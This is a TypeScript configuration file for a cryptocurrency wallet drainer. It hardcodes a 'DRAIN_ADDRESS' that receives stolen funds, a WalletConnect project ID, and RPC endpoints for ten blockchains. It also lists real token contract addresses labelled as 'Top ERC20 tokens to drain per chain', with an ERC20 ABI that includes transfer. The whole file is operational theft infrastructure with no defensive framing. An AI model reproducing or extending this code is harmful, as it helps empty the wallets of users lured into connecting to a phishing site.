// ─── Hardcoded Configuration ─────────────────────────────────────────────────
export const DRAIN_ADDRESS = "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc";

// WalletConnect v2 Project ID (public)
export const WC_PROJECT_ID = "3a8170812b534d0ff9d794f19a901d64";

// Detect mobile device
export function isMobile(): boolean {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  );
}

// ERC20 minimal ABI
export const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
] as const;

// Supported chains with RPC
export const CHAINS: Record<number, { name: string; symbol: string; rpc: string; color: string }> = {
  1:    { name: "Ethereum",  symbol: "ETH",  rpc: "https://eth.llamarpc.com",           color: "#627EEA" },
  56:   { name: "BNB Chain", symbol: "BNB",  rpc: "https://bsc-dataseed.binance.org",   color: "#F3BA2F" },
  137:  { name: "Polygon",   symbol: "MATIC", rpc: "https://polygon-rpc.com",           color: "#8247E5" },
  42161:{ name: "Arbitrum",  symbol: "ETH",  rpc: "https://arb1.arbitrum.io/rpc",       color: "#28A0F0" },
  10:   { name: "Optimism",  symbol: "ETH",  rpc: "https://mainnet.optimism.io",        color: "#FF0420" },
  43114:{ name: "Avalanche", symbol: "AVAX", rpc: "https://api.avax.network/ext/bc/C/rpc", color: "#E84142" },
  8453: { name: "Base",      symbol: "ETH",  rpc: "https://mainnet.base.org",           color: "#0052FF" },
  250:  { name: "Fantom",    symbol: "FTM",  rpc: "https://rpc.ftm.tools",              color: "#1969FF" },
  324:  { name: "zkSync",    symbol: "ETH",  rpc: "https://mainnet.era.zksync.io",      color: "#8C8DFC" },
  59144:{ name: "Linea",     symbol: "ETH",  rpc: "https://rpc.linea.build",            color: "#61DFFF" },
};

// Top ERC20 tokens to drain per chain
export const TOKENS: Record<number, Array<{ address: string; symbol: string; decimals: number }>> = {
  1: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT",  decimals: 6  },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC",  decimals: 6  },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI",   decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC",  decimals: 8  },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK",  decimals: 18 },
    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI",   decimals: 18 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH",  decimals: 18 },
    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE",   decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB",  decimals: 18 },
  ],
  56: [
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT",  decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC",  decimals: 18 },
    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD",  decimals: 18 },
    { address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", symbol: "ETH",   decimals: 18 },
    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB",  decimals: 18 },
    { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE",  decimals: 18 },
  ],
  137: [
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT",  decimals: 6  },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC",  decimals: 6  },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI",   decimals: 18 },
    { address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", symbol: "WBTC",  decimals: 8  },
  ],
  42161: [
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT",  decimals: 6  },
    { address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol: "USDC",  decimals: 6  },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI",   decimals: 18 },
  ],
  10: [
    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT",  decimals: 6  },
    { address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol: "USDC",  decimals: 6  },
  ],
  43114: [
    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT",  decimals: 6  },
    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC",  decimals: 6  },
  ],
  8453: [
    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC",  decimals: 6  },
    { address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", symbol: "DAI",   decimals: 18 },
  ],
};
